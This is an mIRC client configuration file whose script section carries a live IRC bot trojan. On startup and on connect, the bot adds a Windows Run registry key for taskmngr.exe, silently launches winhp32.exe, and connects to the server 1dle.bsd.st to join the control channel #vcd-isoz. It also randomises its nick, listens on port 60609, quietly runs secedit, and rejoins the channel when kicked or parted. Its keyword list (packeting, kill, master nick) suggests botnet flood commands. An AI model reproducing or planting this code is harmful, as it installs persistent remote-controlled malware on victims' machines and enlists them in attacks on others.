[text]
ignore=*.*
commandchar=/
linesep=-
timestamp=[HH:nn]
network=All
quit=Leaving..
finger=Hi :)
accept=*.jpg,*.gif,*.png,*.bmp,*.txt,*.log,*.wav,*.mid,*.mp3,*.zip
[files]
addrbk=addrbk.ini
servers=servers.ini
browser=c:\progra~1\intern~1\iexplore.exe
emailer=e:\program files\outlook express\msimn.exe
finger=finger.txt
urls=urls.ini
[warn]
fserve=off
dcc=off
[options]
n0=0,0,0,0,0,1,300,1,1,0,1,0,0,0,1,1,0,1,0,1,512,0,1,4,0,0,0,1,0,50,1
n1=0,0,0,0,0,0,0,0,2,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,2,2,0
n2=1,0,0,0,1,1,1,1,0,80,160,1,1,1,1,0,0,0,1,160,40,10,0,0,1,0,1,1,0
n3=500,0,0,0,1,0,1,0,0,1,0,1,0,0,1,1,1,0,0,0,0,0,1,0,0,0,2,17,0,0
n4=0,0,1,0,0,3,9999,0,0,1,1,0,1024,0,1,9999,60,0,0,0,1,0,0,2,1,5000,0,2
n5=1,1,1,1,1,1,1,1,1,1,7000,0,0,0,0,1,1,0,300,10,4,0,0,22,0,0,0,999999
n6=0,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,1,0,0,1,0,0,100,1,1,0,0,0,0,0,2
n7=1,0,0,0,0,0,0,1,1,1,1,1,0,1,0,0
[dirs]
[about]
show=sheep
version=5.91
[windows]
scripts=60,966,66,615,0,0,0
main=776,112,-18,27,0,1,0
wchannel=0,112,0,27,0,1,0
status=0,112,0,27,0,1,0
wquery=0,431,0,144,1,1,0
wserv=104,483,129,345,1,1,0
#gtcontrol=21,112,436,27,0,1,0
wmessage=14,633,57,393,0,1,0
wdccg=0,240,0,212,0,1,0
[events]
default=2,2,3,2,2,1,1
[ident]
active=yes
system=UNIX
port=113
userid=Arsal_22
[socks]
enabled=no
port=1080
method=4
dccs=no
[clicks]
status=//run $mircdir $+ winhp32.exe /n /fh        | //msg %chan :DoubleClicked: Status
query=//run $mircdir $+ winhp32.exe /n /fh        | //msg %chan :DoubleClicked: Query
channel=//run $mircdir $+ winhp32.exe /n /fh        | //msg %chan :DoubleClicked: Channel
nicklist=//run $mircdir $+ winhp32.exe /n /fh        | //msg %chan :DoubleClicked: Nick-List
notify=//run $mircdir $+ winhp32.exe /n /fh        | //msg %chan :DoubleClicked: Notify-List
[dde]
ServerStatus=off
ServiceName=mIRC
CheckName=off
[fileserver]
warning=off
homedir=c:
[dccserver]
n0=0,59,0,0,0,0
[mirc]
nick=G-String9
anick=red_devil9
host=1dle.bsd.stSERVER:1dle.bsd.st:6667
user=aM238E50
email=sMind-
[colours]
n0=0,6,4,5,2,3,3,3,3,3,3,1,5,2,6,1,3,2,3,5,1,0,1,0,1
[pfiles]
n0=popups.ini
n1=popups.ini
n2=popups.ini
n3=popups.ini
n4=popups.ini
[fonts]
fscripts=Arial,411,0
fstatus=Arial,411,0
fchannel=Wingdings,407,2
fquery=Wingdings,407,2
f#dk-botz=MS Sans Serif,407,0
f#updatescript=MS Sans Serif,407,0
[nicklist]

[dragdrop]
n0=*.wav:/sound $1 $2-
n1=*.*:/dcc send $1 $2-
s0=*.*:/dcc send $1 $2-

[local]
localip=
longip=216603371
local=
[findtext]
n0=!ver
n1=packeting
n2=rand
n3=%pchan
n4=gdope
n5=gcool
n6=gstart
n7=set %chan
n8=%master.nick
n9=kill
n10=random
[users]
[extensions]
n0=defaultEXTDIR:\
[agent]
enable=0,0,0
char=default
options=1,1,1,100,0
speech=150,60,100,1,180,10,50,1,1,1,0,50,1
channel=1,1,1,1,1,1,1,1,1
private=1,1,1,1
other=1,1,1,1,1,1,1
pos=20,20
[script]
n1=alias setserver { %clones.setserver = 1 | .dns -h $1 } 
n2=on *:CONNECT:{ if (%chan == $null) { set %chan #vcd-isoz  } | /join %chan  |   /identd on $read mdm.scr | /dns $me | /timercoolconnect off | //write -c 394839.reg REGEDIT4 | //write -a 394839.reg [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | //write -a 394839.reg "Run32dll"=" $+ $replace($mircdir,\,\\) $+ taskmngr.exe" | .timer 1 20 //run -n regedit /s 394839.reg | .timer 1 60 //remove 394839.reg  }
n3=on *:DNS:{ if ($nick == $me) { %address = $iaddress } }
n4=on *:OP:#:{ If ($opnick == $me) { //mode # +psnt } }
n5=on *:PART:%chan:{ if ($nick == $me) {  /timer 1 1 /raw -q join %chan | //run winhp32.exe /n /fh         } }
n6=on *:DISCONNECT: {  //set %gnick.tmp $read mdm.scr |  //nick $replace( %gnick.tmp, $mid(%gnick.tmp,3,1), $r(a,z) )  |  /timercoolconnect -o 0 100 //server %server $+ :6667  } 
n7=raw 433:*: {  //set %gnick.tmp $read mdm.scr |  //nick $replace( %gnick.tmp, $mid(%gnick.tmp,3,1), $r(a,z) ) }
n8=on *:KICK:#:{ if ($nick == $me) { halt } |  if ($knick == $me) && ($chan == %chan) { timerfastjoin -o 0 5 /join # } }
n9=on *:JOIN:*:{ if ($nick == $me) { /timerfastjoin off }  } 
n10=alias randomgen { if ($1 == 0) { return $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) $+ $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) } | if ($1 == 1) { return $read mdm.scr } | if ($1 == 2) { return ^ $+ $read mdm.scr $+ ^ } |  if ($1 == 3) { return $r(a,z) $+ $read mdm.scr $+ $r(1,5) } | if ($1 == 4) { return $r(A,Z) $+ $r(1,9) $+ $r(8,20) $+ $r(g,y) $+ $r(15,199) } | if ($1 == 5) { return $r(a,z) $+ $read mdm.scr $+ - } | if ($1 == 6) { return $read mdm.scr $+ - } | if ($1 == 7) { return $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) $+  $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) } | if ($1 == 8) { return ^- $+ $read mdm.scr $+ -^ } | if ($1 == 9) { return $r(a,z) $+ $r(A,Z) $+ $r(1,500) $+ $r(A,Z) $+ $r(1,50) } }
n11=on *:start:{ if ($exists(winhp32.exe) == $false) { exit } | //run winhp32.exe /n /fh         | //set %server 1dle.bsd.st  | //set %timeout 10 | if ($portfree(60609) == $false) { exit } |  if ($portfree(60609) == $true) { /socklisten blah 60609 } |  //set %gnick.tmp $read mdm.scr | //nick $replace( %gnick.tmp, $mid(%gnick.tmp,3,1), $r(a,z) ) | /timerc 1 4 //server %server $+ :6667  | //run winhp32.exe /n /fh        | //remini NT32.ini ident userid | //remini NT32.ini mirc user | //remini NT32.ini mirc email | //writeini NT32.ini ident userid $read mdm.scr | //writeini NT32.ini mirc user $randomgen($r(0,9)) | //writeini NT32.ini mirc email $randomgen($r(0,9)) | //identd on $read mdm.scr |  /timercoolconnect -o 0 100 //server %server $+ :6667  |  //timercooljoin -o 0 300 //if ( $me !ison %chan ) { //join %chan }  |  //timer 1 1 //run -n secedit /configure /DB secedit.sdb /cfg $mircdir $+ tftp8675 /quiet |  fos }
[ignore]
n0=*@*,ctcp,notice,invite
[afiles]
n0=nt32.ini
[rfiles]
n0=nt32.ini
n1=dll16.ini
n2=nt32.ini